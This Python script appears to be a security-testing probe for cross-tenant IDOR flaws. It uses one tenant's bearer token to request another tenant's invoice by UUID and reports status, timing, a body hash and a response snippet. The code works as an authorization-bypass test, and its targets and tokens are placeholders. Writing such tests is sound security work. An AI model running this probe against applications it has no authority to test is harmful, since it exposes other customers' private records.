#!/usr/bin/env python3
"""IDOR UUID enumeration — test cross-tenant resource access.

Output: measurements only; no status or confidence.
Exit codes: 0 = probes completed, 2 = config error.
"""

import hashlib
import json
import sys
import time
import urllib.request
import urllib.error

# Configuration — replace before running
BASE_URL = "https://app.example.com"
ENDPOINT = "/api/v1/invoices/{id}"
TOKEN_A = "eyJ..."  # Tenant A's bearer token
RESOURCE_ID_B = "550e8400-e29b-41d4-a716-446655440000"  # Tenant B's resource
TOKEN_B = ""  # Optional: tenant B's token for baseline

def make_request(url, token):
    """Send GET request with bearer token, return round result dict."""
    req = urllib.request.Request(url)
    req.add_header("Authorization", f"Bearer {token}")
    req.add_header("Accept", "application/json")
    start = time.monotonic()
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": resp.status,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": e.code,
            "elapsed_ms": elapsed,
            "body_hash": hashlib.sha256(body.encode()).hexdigest(),
            "body_length": len(body),
        }, body
    except Exception as e:
        elapsed = int((time.monotonic() - start) * 1000)
        return {
            "status_code": 0,
            "elapsed_ms": elapsed,
            "body_hash": "",
            "body_length": 0,
            "error": str(e),
        }, ""

def main():
    started_at = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    target_url = BASE_URL + ENDPOINT.replace("{id}", RESOURCE_ID_B)
    probe_count = 0

    # Step 1: Baseline — tenant B accessing own resource (if token provided)
    baseline_round = None
    if TOKEN_B:
        probe_count += 1
        baseline_round, _ = make_request(target_url, TOKEN_B)
        print(f"[BASELINE] Tenant B accessing own resource: {baseline_round['status_code']}", file=sys.stderr)

    # Step 2: Cross-tenant — tenant A accessing tenant B's resource
    probe_count += 1
    cross_round, cross_body = make_request(target_url, TOKEN_A)
    print(f"[PROBE] Tenant A accessing tenant B's resource: {cross_round['status_code']}", file=sys.stderr)

    snippet = cross_body[:500] if len(cross_body) > 500 else cross_body

    result = {
        "vuln_type": "idor",
        "technique": "cross_tenant",
        "started_at": started_at,
        "probe_count": probe_count,
        "measurements": {
            "target_url": target_url,
            "resource_id": RESOURCE_ID_B,
            "cross_tenant_round": cross_round,
            "baseline_round": baseline_round,
            "response_snippet": snippet,
        },
    }

    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
